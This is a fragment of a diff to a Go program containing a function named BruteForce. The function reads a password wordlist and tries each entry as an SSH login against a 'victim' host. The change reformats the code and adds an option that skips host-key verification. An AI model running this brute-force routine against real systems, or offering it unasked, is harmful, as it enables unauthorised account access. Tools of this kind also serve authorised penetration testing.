@@ -60,8 +60,8 @@ fmt.Printf("Success %v:%v is up! \n",check_values.address,check_values.port)
 //fmt.Println(conn)
 defer fmt.Printf("Time: %v\n",time.Now())
   }
-                return &check_values
-        }
+		return &check_values
+	}
 
     func BruteForce(sshuser string, wordlist string, victim string, port int) *Verify{
       brute := Verify{address: victim, port: port, name: sshuser, pass_file: wordlist}
@@ -74,10 +74,12 @@ log.Fatal(err)
       readlines := bufio.NewScanner(passwords)
       for readlines.Scan(){
     config := &ssh.ClientConfig{
-        User: brute.name,
-        Auth: []ssh.AuthMethod{
-                ssh.Password(readlines.Text()),
-        },
+	User: brute.name,
+	Auth: []ssh.AuthMethod{
+		ssh.Password(readlines.Text()),
+	},
+    HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+
 }
 if err := readlines.Err(); err != nil{
 log.Fatal(err)
@@ -107,3 +109,4 @@ func main(){
 Check(value1,value2)
 BruteForce(value3,value4,value1,value2)
 }
+
